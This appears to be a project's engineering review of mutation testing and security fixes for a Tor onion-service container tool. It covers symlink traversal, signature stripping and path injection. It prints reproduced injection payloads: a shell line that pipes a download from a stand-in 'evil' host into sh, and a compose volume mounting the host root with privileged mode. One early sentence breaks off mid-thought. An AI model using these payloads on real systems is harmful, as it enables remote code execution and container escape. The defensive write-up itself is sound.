# Mutation testing: a kill rate, and what it cost to get one

**Date:** 2026-09-18
**Scope:** `entrypoint.py`, `healthcheck.py`, `vanity.py`, and the host test suite
**Supersedes:** the 2026-09-14 review finding "Mutation testing produced zero signal"

---

## What was true before

The 2026-09-14 review recorded, correctly, that the mutmut artifact held **787
generated mutants and 0 checked**, and that the project therefore had no evidence
its 295-test suite would catch a regression at all. `scripts/mutation_spotcheck.py`
was written in response: nine hand-applied mutations, all killed, and a docstring
blaming a harness-integration defect in mutmut 3.5.0 under this project's pytest
configuration.

**That diagnosis was wrong.** It was a plausible theory that was never reproduced.
Reproducing it took two commands and found two ordinary bugs, both in this
repository rather than in mutmut.

### Cause 1: the wrong entry point

`python -m mutmut run` executes `mutmut/__main__.py` as `__main__`, so
`mutmut.__main__` is *not* in `sys.modules`. The trampoline that mutmut injects
into every mutated function does this during the statistics pass:

```python
from mutmut.__main__ import record_trampoline_hit
```

which re-imports the whole module, which calls `set_start_method('fork')` a second
time:

```
RuntimeError: context has already been set
```

The first test to touch a mutated function killed the run. The console script
(`.venv/bin/mutmut`) imports `mutmut.__main__` as a module, so the re-import is a
no-op and the same run works.

### Cause 2: a source-text audit reading the mutated source

`tests/test_subprocess_timeouts.py` checks that every `subprocess.run`/`Popen`
call has a `timeout=` or an adjacent comment explaining why it does not. It
located the sources with `Path(__file__).resolve().parent.parent`. Under mutmut
that is `mutants/`, where `entrypoint.py` has been rewritten into one function per
mutant and the call sites' justifying comments are no longer adjacent. The audit
failed on an **unmutated baseline**, the stats pass runs with `-x`, and the run
aborted. With no statistics, every mutant maps to zero tests and is recorded as
"not checked", which is exactly the artifact that was found.

`tests/loader.py` already had `repo_root()` for precisely this reason, written
when the same class of problem broke an earlier run. The new test simply did not
use it.

Both are fixed. `mutmut run` now completes.

The mutant count rose from 2,166 to 2,247 because a later round of live-container

and names the module.

### The timeouts were hiding survivors

The earlier version of this document said the timeouts were "detected, not lost
exit conditions" and the gate counted them as killed. That was an assumption, and
measuring it showed it was wrong. mutmut's bound is WALL clock --
`(estimated_test_time + 1) * 15` seconds -- so on a machine carrying three other
sweeps it fires on mutants that do not hang at all. Re-running each of the 17 on
its own against a 300-second budget:

| Outcome | Count | What it means |
|---|---:|---|
| Really hangs | 3 | Detection. The mutant removed a loop's exit condition. |
| Killed | 7 | A test fails it in 9 to 59 seconds. The timeout was load. |
| **Survives** | **7** | **The gate was reporting these as caught.** |

Five of the seven survivors already had allowlist entries, so the answer was
merely being reached by luck. **Two did not**: both write
`_emit(0, True, payload, "")` in `vanity.main`, where the JSON arm of `_emit`
never reads the human text. Equivalent mutants, but nobody had said so, and the
gate was green anyway. A gate that is green for a reason it cannot state is a
gate that will be green on the day the reason stops being true.

So `scripts/mutation_gate.py` now re-grades every timeout itself and classifies
it: a kill counts as a kill, a survivor goes through the same allowlist as any
other survivor, and a hang must be named in `DOCUMENTED_HANGS` together with the
exit condition it removed. Four mutants are documented there:

| Mutant | The exit condition it removed |
|---|---|
| `entrypoint.main`, `tor_rc = None` | The supervision loop leaves only when `poll()` stops returning None |
| `entrypoint.main`, `if tor_rc is not None` inverted | The same loop, from the other side: the arm that exits is taken while Tor runs and never once it is gone |
| `healthcheck._query`, `if not chunk` inverted | The read ends on the empty chunk that means the socket closed, so it never ends at EOF |
| `vanity._unique_archive_path`, `n += 1` to `n = 1` | The suffix search retries one taken name forever |

Three, not four, show up as hangs in any given run: the inverted `tor_rc` test is
killed in seconds on an idle box and hangs on a busy one. Both are detection, and
writing it down is what stops the classification from flapping. It was found
exactly that way, by a second full pass at load 144 where the gate went red on a
hang nobody had looked at.

Each red path was proved: deleting a `DOCUMENTED_HANGS` entry gives `exit=1`, and
so does deleting the allowlist entry for a re-graded survivor.

"No tests" is the number that matters most in the early rows: a mutant no test
touches is not a weak test, it is no test. It is now zero for all three files.

`scripts/hiddenforge` is **not** in this table. mutmut only generates mutants for
files ending in `.py` (`walk_source_files` / `should_ignore_for_mutation` in
`mutmut/__main__.py`), and the CLI is an extensionless script. Its coverage is
`tests/test_cli.py` plus the curated kill-check in
`scripts/mutation_spotcheck.py`, which is now scoped to say so.

## Defects found

Fifteen, none of them cosmetic, in three groups.

**Found because a mutation survived** (§1-§7): the shipped modules mutmut can
reach, plus the two harness bugs that had been hiding the whole measurement.

**Found by reading the code mutation testing cannot reach** (§9-§17):
`scripts/hiddenforge` has no `.py` extension, so mutmut generates nothing for it.
Five of the session's defects are there, including every one that touches the
supply chain or destroys a key. That gap is the single strongest argument for the
curated list in `scripts/mutation_spotcheck.py`, which now carries fifteen
mutations and is the only automated guard that file has.

**Found by applying a finding to its whole family** (§17, and the test-weakness
audit): a hole in one interpolation is a question about every interpolation; a
fake that rescues one mutant probably rescues others. Both questions were asked
in full, not once.

### 1. A hostname file was sanitised and then published: `entrypoint._publish_addresses`

`raw.decode('ascii', 'ignore')` deletes any byte outside ASCII and matches what is
left. A `hostname` file holding one stray byte beside a valid address therefore
published an address that is **not what the file says**: a sanitised answer to a
question that should have been refused. A non-ASCII byte in a file Tor wrote
itself means the key volume is not in the state we think it is.

Now decoded strictly, inside a guard (an escaping `UnicodeDecodeError` would kill
the supervision loop that calls this once a second). A file that is not clean
ASCII is skipped and the address simply never appears.

### 2. A path-based chown on a file we had just opened: `entrypoint._write_dropped_mappings`

The file was opened `O_NOFOLLOW` and then chowned **by path**. A path-based chown
re-resolves the name: it is a second lookup that can land on a different inode
than the descriptor did. `follow_symlinks=False` narrows that but does not remove
it. Now `os.fchown` on the descriptor, matching what the torrc write and the
address publisher already did.

### 3. A file mode that depended on the umask: `entrypoint._write_dropped_mappings`

`os.open(..., 0o600)` is a *request*: the kernel applies the process umask to it,
so it guarantees "no more than 0600", not "exactly 0600". The file records which
services were refused and why. It now sets the mode outright with `os.fchmod`,
as the other two writers do. (This is also why several surviving mode mutants are
genuinely equivalent; see the allowlist.)

### 4. A lost race reported as a usage error: `vanity.main`

`vanity.py`'s own docstring, `manifest.json` and `hiddenforge info` all say exit
code **3** means "a key appeared at the output path while a search was running".
The code raised `FileExistsError` with the string `(exit 3)` in the message, and
`main()` caught `FileExistsError` and returned **2**, "usage, validation, or
environment error". An automated caller was being sent to fix its arguments when
the correct response was to retry or find out what else is writing to the key
volume. Now a `KeyRaceError` (a `FileExistsError` subclass, so old callers still
catch it) with its own arm returning 3.

### 5. A chmod that could be redirected by a symlink: `vanity._harden`

`if p.is_symlink(): ... else: os.chmod(p, 0o600)` re-resolves the name between the
check and the change. A process able to write into the operator-supplied output
directory could replace a regular file with a symlink in that window and have the
chmod land on its target. Linux has no `lchmod`, so the only fix is to hold the
descriptor: every mode and owner is now set with `fchmod`/`fchown` on an
`O_NOFOLLOW` descriptor, including the key directory itself. This is the pattern
`entrypoint.py` already used for the key directories and the torrc.

### 6. Four copies of one path, none of them testable: `entrypoint.py`

`/var/lib/tor/hidden_service` was spelled out literally in four places and
`/etc/tor/torrc` in two, which is why `generate_basic_torrc` had **no tests at
all**: exercising it meant being root inside a container. They are now the module
constants `KEYS_ROOT`, `TORRC_PATH` and `DATA_DIR` (the same strings the rest of
the module already needed), and the function runs against a temp directory.
`healthcheck.py` gained `PROC_ROOT` for the same reason.

### 7. The mutation harness would have lied about two of the three files

`tests/loader.py:repo_root()` deliberately walks *out* of `mutants/` to find the
real repository, because `scripts/hiddenforge` is not copied there. That is the
right answer for the CLI and the wrong one for a file mutmut did rewrite: loading
`/repo/vanity.py` while the mutant sits at `/repo/mutants/vanity.py` runs
unmutated code, and every mutant survives while the report calls the file tested.
`source_path()` now prefers the sibling copy and falls back to the real root.

Separately, mutmut's trampoline activates a mutant only when `orig.__module__`
matches the name in `MUTANT_UNDER_TEST`. `tests/test_vanity.py` loaded the module
as `hf_vanity_unit`, which would have silently disabled every one of its 772
mutants. Both test modules now load under the real module name, with a comment
saying why.

### 8. A mutation run that quietly corrupted its own working tree

Found the hard way, twice, after fix #5 went in. `vanity._harden` now opens each
entry relative to a directory descriptor. Python's API for that falls back to the
**current working directory** when the descriptor is absent, so the mutant
`dir_fd = None` does not fail: `os.listdir(None)` lists the working directory and
the function chmods everything in it to 0600.

Under mutmut the working directory is the generated `mutants/` tree. One mutant,
somewhere past the thousandth, made `mutants/tests` unreadable; every test that
ran afterwards died loading `conftest.py`, and a non-zero exit is how mutmut
scores a kill. Two full runs reported a healthy-looking kill rate that was
manufactured by 265 `PermissionError`s. The repository itself was never touched:
mutmut runs its children inside `mutants/`.

The containment is one autouse fixture in `tests/conftest.py` that runs every test
from a throwaway directory. Mutation testing deliberately produces destructive
code; where the working directory is the blast radius, the containment belongs in
the harness rather than in whichever test happens to reach such a function.

The lesson is about the method, not the code: **a kill rate whose failures were
not read is not a result.** The counter went up either way.

### 9. The key-volume size budget was checked after the read: `scripts/hiddenforge`

Not found by mutation testing, because mutmut cannot reach this file. Found by
reading it for the same class of defect the mutants had been pointing at.

`_tar_keys` walked the key volume with `data = path.read_bytes()` and only then
tested `total > max_bytes`. A single file larger than memory was therefore already
read in full by the time the guard ran. This walks the operator-supplied key
volume, which the project's own threat model allows to have been restored from
untrusted media, so a planted file is in scope: `hiddenforge backup` would be
killed by the OOM killer rather than refusing.

It now calls `path.stat().st_size` before reading, which makes the limit a limit.
A test asserts it by making `read_bytes` raise, and `scripts/mutation_spotcheck.py`
carries the pre-fix code as a tenth curated mutation.

### 10. Restore followed a symlinked directory already in the key volume: `scripts/hiddenforge`

The most serious finding in this pass, and also not from a mutant: from reading
`cmd_restore` with the same question the mutants had been asking.

It refuses archive members that are symlinks, hardlinks or devices, and refuses
names that are absolute or contain `..`. All correct, and all about the ARCHIVE.
The traversal that matters is in the DESTINATION. A key volume that already
contains `app -> /somewhere/else` turns a member named
`app/hs_ed25519_secret_key` -- absolute-free, `..`-free, and accepted by every
check -- into `dest.parent.mkdir(parents=True)` followed by `os.open(dest, ...)`
landing outside the volume. `O_NOFOLLOW` on the final component does not help:
the traversal happened in the parent.

Reproduced before anything was changed:

```
absolute? False   '..' in parts? False
written to: /tmp/restore-probe/outside/hs_ed25519_secret_key
```

The onion secret key is written wherever the link points, and the operator is
left with a key directory that Tor will regenerate from scratch under a new
address. The key volume is operator-supplied and this project's threat model
explicitly allows it to have been restored from untrusted media.

Every write in `cmd_restore` is now made relative to a descriptor: the volume is
opened `O_DIRECTORY|O_NOFOLLOW`, each component is created and opened the same way
beneath it, and the conflict scan, the archive-aside rename and the extraction all
use `dir_fd`. A symlinked component now raises `ENOTDIR` and the restore fails
loudly. Held by a test that plants the link and asserts nothing lands outside, and
by an eleventh curated mutation in `scripts/mutation_spotcheck.py` that removes
`O_NOFOLLOW` from the component open.

### 11. `--delete-plaintext` destroyed an unrecoverable key on an unverified archive

`encrypt-key --delete-plaintext` wrote the ciphertext and then
`shutil.rmtree(d)` -- the only copy of an onion identity removed on the strength
of "gpg exited 0". A zero exit says the command ran. It does not say that what
reached the disk can be opened again: a full filesystem, a short write, or a
passphrase file carrying one byte the operator did not mean all exit 0 and leave
a blob that never decrypts.

Every other destructive path in this project archives rather than deletes --
`vanity --force` renames the old key set aside, `restore --force` moves conflicts
to `.replaced-<t>`, `rotate` moves the whole volume. This one was the exception,
on the one artifact whose loss is permanent.

It now reads the file back, decrypts it, and compares the SHA-256 with the tar it
encrypted, before removing anything. Where that check cannot be made -- age
decrypts only from a TTY, so there is no non-interactive read-back -- it refuses
to delete and says why, rather than deleting on an unverified archive. The write
is also `fsync`ed, because the read-back is worth little against page cache.

### 12. The same destination traversal in `decrypt-key`

`_encrypt_or_decrypt_dir`'s extract path had the identical shape to `cmd_restore`:
clean-archive checks plus `dest.parent.mkdir(parents=True)` and a path-based open.
It now uses the same descriptor walk. Held by a test that plants a symlinked
subdirectory in the destination and asserts nothing lands outside it.

### 13. A stripped post-quantum signature verified as VERIFIED

`verify-image` checks two signatures over the same digest: SSH-FIDO2 and
ML-DSA-65. The ML-DSA verdict is tri-state, and only `False` was treated as a
failure:

```python
if pq_ok is False:
    failures.append(...)
```

`_verify_mldsa_signature` returned `None` -- "nothing to report" -- when the
public key **or** the signature was missing. Delete `sambent-mldsa.pub` from a
distributed signature directory and the hybrid scheme silently becomes a single
classical signature, with the tool still printing `VERIFIED`. That is signature
stripping, and it is the one attack a hybrid scheme exists to stop.

Now: one half present without the other is a FAILURE, because a signature set
that has been altered is not a signature set. A set that never carried a
post-quantum signature, or a machine with no `pqsign` installed, is reported as
NOT CHECKED -- in the JSON as a new `unchecked` list, and on the human line as
`VERIFIED, BUT NOT COMPLETELY: ...`, so the word "verified" is never printed
alone for an image only half of whose signatures were examined.

### 14. The key-volume path was injectable into both generated files

The worst of the three, and the one that says most about where to look:
`validate_image_ref` and `validate_container` exist, and `--keys` had no validator
at all. That asymmetry was the tell.

`setup` writes two files from operator input: `compose.service.yml`, which the
operator merges with `docker compose -f their.yml -f compose.service.yml up -d`,
and `deploy.sh`, written mode 0755 with the README telling them to run it. The
key path went into both by plain interpolation.

Reproduced, both of them:

```
volumes: ['/tmp/keys:/var/lib/tor/hidden_service', '/:/host']
privileged: True
```

```
mkdir -p "/tmp/keys"; curl http://evil/x | sh; echo ""
```

A container escape written into a compose file, and arbitrary code in a script
the operator is told to execute. `setup` is the machine-facing adoption path --
`docs/INTEGRATION.md` describes programs calling it -- so the value need not have
been typed by the person who runs the result.

Fixed at both ends. The YAML scalar is emitted with `json.dumps`, which YAML
parses as one string, so a path cannot open a second key or a second volume. The
shell uses `shlex.quote`, so a payload is inert data inside single quotes; the two
`echo` lines that show the path in prose neutralise quotes, `$` and backticks.
And `validate_keys_dir` refuses control characters, because a path with a newline
in it is not one anybody meant to type.

The golden files moved by exactly two lines, both of them the new quoting, and the
compose fragment parses to a structurally identical document.

### 15. `doctor` failed on the project's own recommended deployment

`REQUIRED_CAP_ADD` carried the comment "Mirrors both compose files". It did not.
It mirrors `docker-compose.yml`'s five capabilities, while `podman-compose.yml`
deliberately grants three and says why beside them: under rootless Podman,
container root maps to the invoking host user, so the bind-mounted key volume is
already writable and neither DAC_OVERRIDE nor FOWNER is required.

So `hiddenforge doctor` against a container started from this project's own
podman compose file reported:

```
[FAIL] cap_add includes every required capability: missing: ['DAC_OVERRIDE', 'FOWNER']
```

The maintainer's deployment notes record that the deployed instance runs
podman. This fired on the recommended configuration, in production, and a check
that fails on the configuration you ship teaches operators to ignore it.

The requirement is now runtime-aware. `doctor` already adapted its AppArmor check
to the host, so the pattern was there; capabilities had been missed. Rootlessness
is asked of the engine rather than inferred, and any answer other than a clear
"true" leaves the strict five-capability set in force, so a failed query can only
make the check stricter.

The ceiling is unchanged: a capability nobody asked for is still a finding on
either runtime.

### 16. `show` reported an address the container would not serve

`address_for` reads `hostname`, falls back to the published copy, and only then
derives from the public key. It never compared them.

The public key is the address. A key directory whose `hostname` says something
else is inconsistent: a partial restore, or files from two services in one
directory. Tor rewrites `hostname` from the key when it starts, so it serves the
DERIVED address while the operator publishes the one `show` reported.

`vanity.generate` already refuses exactly this disagreement at creation time; the
read path did not check it. Nothing about the fix is clever: the derivation was
already being computed on one branch, so it now happens on all of them and the
document carries `derived_matches`. `true`, `false`, and `null` for "could not
tell" are three different answers, and only one of them is a fault. `onion` and
`source` are untouched, so the machine contract in `manifest.json` still holds,
and `doctor` fails a key set whose halves disagree.

This is the H6 lesson in a different place: do not report an address you cannot
back.

### 17. The same injection, one interpolation over

After fixing `--keys` I audited every other value `render_compose_fragment` and
`render_deploy_sh` interpolate, instead of stopping at the one that had been
found. `image`, the service names, the backend hosts and ports, `runtime` and
`--onion-port` all reach those files through a validator or `type=int`.
`--container` did not, and it becomes a YAML **key**:

```
service keys: ['tor', 'other']
privileged on 'tor': True
```

`validate_container` already existed and was simply not applied in `setup`. It is
now, plus `shlex.quote` where the name reaches the shell, and `--onion-port` is
range-checked at `setup` time rather than emitting a compose file whose service
the container drops at boot with the reason only in a log the shipped compose
file discards.

The lesson is the method, not the bug: a finding in one interpolation is a
question about every interpolation.

### 18. Two ways mutmut reports a mutant as handled when it was not

Both found by reading the failures rather than the summary line.

**Timeouts are wall-clock, and this box is shared.** `timeout_checker` in
`mutmut/__main__.py` sends `SIGXCPU` to any child running longer than
`(estimated_time_of_tests + 1) * 15` **seconds of wall time** -- not CPU time,
despite the signal. Run under a CPU cap, or simply on a workstation at load 105
because three other mutation sweeps are running, healthy tests cross that bound
and are recorded as `timeout`. 54 mutants were reported that way in the final run.
Re-graded one at a time against a fixed budget, the majority turned out to be
**survivors**: undetected mutants wearing a label that reads like detection.

A timeout is only evidence of a lost exit condition on an idle machine. On a busy
one it has to be re-measured before it means anything.

**Re-running a subset resets everything else.** `mutmut run <names>` does not add
to the saved results, it rewrites them: after re-running 54 named mutants, the
other 2,112 read back as `not checked`. A complete result therefore has to be
captured before any targeted re-run, and the final number has to come from one
uninterrupted pass.

## Test gaps mutation testing exposed

These were not bugs in the code. They were places where the code was correct and
**nothing would have noticed if it stopped being correct**. All are now held.

| Surface | What survived before |
|---|---|
| `dispatch_subcommand` | Inverting `argv[0] in AS_TOR`, running `show`/`doctor` as root and `setup`/`backup`/`restore` as the tor user. Also `su-exec` → `SU-EXEC`, so the privilege drop never happens. |
| `_drop_setup_capabilities` | No tests at all. `mask & 0xFFFFFFFF` → `mask \| 0xFFFFFFFF` asks the kernel for **every** capability in the low block; `mask & 4294967296` evaluates to 0 and silently drops `CAP_DAC_OVERRIDE`, permanently disabling address publication. Both still print the success line. |
| `_service_reachable` | No tests at all, including `if gate is not None and gate():`, which inverts the publication gate and publishes exactly when the service is *not* reachable. That is the H6 defect, restored, with a green suite on top of it. |
| `build_torrc_string` | `continue` → `break` on the invalid-name and name-collision skips: one bad env var silently drops every service whose name sorts after it. |
| `_publish_addresses` | The same `continue` → `break`, four times: one unreadable service stops every later one from ever publishing. |
| `healthcheck.py` | No unit tests at all. `continue` → `break` in `_intro_points` means the first GENERAL circuit ends the scan, reporting every service unreachable; `< 1` → `<= 1` marks a service with one established introduction point as dead. |
| `vanity.py` | 595 of 772 mutants untouched by any test. The entire generator path (the prefix check, the hostname/public-key agreement checks, the archive-don't-delete rule, the race refusal) was covered only by the live E2E run that needs a built image. |
| `wait_for_socket`, `start_vanguards` | No tests. `--disable_vanguards` could be dropped, which makes the addon die on startup under `Sandbox 1`. |

The vanity tests run against `tests/fake_mkp224o.py`, a stand-in that speaks
mkp224o's real command line and writes a real Tor key directory from the published
test vector, so the refusals are exercised rather than mocked away. Its address
starts with `a`, so a one-character prefix is found on the first try and the tests
stay about the refusals.

## What is left, and why

The surviving mutants are listed with a reason each in
`scripts/mutation_gate.py`. They fall into a small number of kinds:

- **Defaults restated.** `os.walk(path, followlinks=False)` → `os.walk(path)`:
  `False` *is* the default. `_kill_proc(proc, "Tor")` → the same `timeout=10`.
- **Codec aliases.** `decode('ascii')` → `decode('ASCII')`: Python normalises
  codec names case-insensitively.
- **Modes that a later `fchmod` overrides.** Now that every writer sets the mode
  explicitly on the descriptor, the mode passed to `os.open` cannot be observed.
  This is a property of fix #3, not a gap.
- **Falsy-equivalent initialisers.** `found_any = False` → `None`.
- **Docstring text.**
- **Clock initialisers that a real monotonic clock makes unreachable.**

A surviving mutant is not automatically a missing test, but it is always a claim
that needs a reason. The gate exists so that the reasons are written down and a
*new* survivor fails the build.

## Three ways this measurement can lie, and what stops each

Written down because each one cost a run before it was understood, and each looks
exactly like a healthy result from the summary line.

| The lie | What it looks like | What stops it |
|---|---|---|
| The run never happened | `mutmut results` prints nothing, which is also what "everything was killed" prints | The gate reads `--all`, counts `not checked`, and refuses a total below a floor |
| A mutant is reported as detected when it was not | `timeout`, from mutmut's wall-clock bound firing on a loaded machine. Measured: 7 of 17 timeouts were live survivors | The gate re-grades every timeout alone against a fixed budget and classifies it; a survivor must be allowlisted and a hang must be in `DOCUMENTED_HANGS` |
| The verdicts and the sources are from different runs | Mutant names that do not exist in `mutants/`, silently grouped under one allowlist key | The gate raises rather than returning a placeholder |
| A whole file stopped being graded | A high kill rate over two thirds of the code; dropping `healthcheck.py` still leaves 1,784 mutants, over the floor | `EXPECTED_MODULES` in the gate is a deliberate second copy of `paths_to_mutate`, checked in both directions, so the config alone cannot shrink the scope |

A fourth, specific to grading a subset: mutmut's per-function test mapping is
captured during the stats pass, so it does not contain tests written since. A
targeted re-grade against a stale mapping reports SURVIVED for mutants the new
tests kill. Only a full pass regenerates the mapping, so only a full pass is a
result.

## The three things this pass had not measured, and now has

Each was listed here as uncovered, then done rather than left.

**R11, the fuzz target, re-run.** The recorded 325,460-run result was evidence
for a target that no longer existed: `fuzz/fuzz_parsers.py` had since gained
invariants over the two files `setup` writes, because the key path turned out to
be an input channel reaching an operator-executed artifact. The re-run crashed on
its second input, and the bug was in the invariant. It compared LINE COUNTS, and
`shlex.quote` puts a newline inside single quotes, which adds a line while adding
nothing executable. Verified by hand that the rendered script is still valid bash
(`bash -n`) and that the payload never becomes a command word. The invariant now
compares structure: the fragment's parsed YAML keys and volumes, and deploy.sh's
shell words, differing only where the benign path was. **162,177 runs, no crash**,
and `tests/test_cli.py` pins the newline case down by hand so the next person does
not rediscover it from a fuzz crash.

An invariant that is too strict is not the harmless kind of wrong. It fires on
safe input, and the reflex it trains is to loosen the check.

**The `mutation` CI job executed, not just written.** `docs/CI.md` says a workflow
that has never been run is not a workflow. `forgejo-runner exec -i -self-hosted -W
.forgejo/workflows/ci.yml -j mutation -E schedule` now runs it end to end: a clean
`--require-hashes` venv, a full `mutmut run`, and the gate. From scratch in the CI
container it independently reproduced the result: 2,166 mutants, 2,101 killed, 63
survived, 10 timeouts of which the gate's re-grade found 2 real hangs, 5 kills and
3 survivors, unexplained 0. **Job succeeded, rc=0.**

**The live E2E against an image built from this tree.** `docker build` from this
working tree, then `tests/test_e2e_live.py` with `HIDDENFORGE_E2E=1` against that
image: **3 passed in 244s** -- a throwaway app published itself as a real `.onion`
through the emitted fragment, the address agreed with `hiddenforge show --json`,
and an in-image vanity search produced a key whose address carried the prefix.
The in-container torrc suite (17 checks) and the CLI machine contract passed
against the same image.
